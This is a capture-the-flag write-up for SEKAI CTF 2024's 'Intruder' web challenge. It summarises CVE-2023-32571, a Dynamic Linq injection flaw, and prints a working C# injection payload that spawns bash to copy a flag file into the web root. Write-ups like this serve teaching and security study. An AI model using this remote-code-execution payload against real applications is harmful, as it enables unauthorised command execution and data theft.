# SEKAI CTF 2024 Write up


## Web Exploitation

### Intruder

#### Results: CVE-2023-32571
###### Overview
- **Severity**: Critical | **CVSS Score**: 9.8
- **CVSS Vector**: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Weaknesses**:
  - Incorrect Comparison
- **Published At:** June 22, 2023 | **Updated At**: July 3, 2023
- **CPE**: dynamic-linq:linq
#### Description
Dynamic Linq 1.0.7.10 through 1.2.25 before 1.3.0 allows attackers to execute arbitrary code and commands when untrusted input to methods including Where, Select, OrderBy is parsed.
#### References:
  - [https://github.com/zzzprojects/System.Linq.Dynamic.Core](https://github.com/zzzprojects/System.Linq.Dynamic.Core)
  - [https://github.com/Tris0n/CVE-2023-32571-POC](https://github.com/Tris0n/CVE-2023-32571-POC)
  - [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
  - [https://github.com/vert16x/CVE-2023-32571-POC](https://github.com/vert16x/CVE-2023-32571-POC)
#### Proof of Concept:

- [https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/](https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/) (Source: NVD, Added: Invalid Date)
- [https://github.com/vert16x/CVE-2023-32571-POC](https://github.com/vert16x/CVE-2023-32571-POC) (Source: gh-nomi-sec, Added: November 18, 2023)
- [https://github.com/Tris0n/CVE-2023-32571-POC](https://github.com/Tris0n/CVE-2023-32571-POC) (Source: gh-nomi-sec, Added: November 18, 2023)
- [https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/](https://research.nccgroup.com/2023/06/13/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/) (Source: trickest, Added: Invalid Date)


#### Vulnerable Code

![image](https://hackmd.io/_uploads/HyQGgIYoC.png)


Payload

```csharp
") && "".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "/bin/bash;-c \"cat /flag_*>/app/src/wwwroot/flag.txt\"".Split(";".ToCharArray())).GetType().ToString() == ("
```

Then access `https://<link>/flag.txt` to retrive the flag.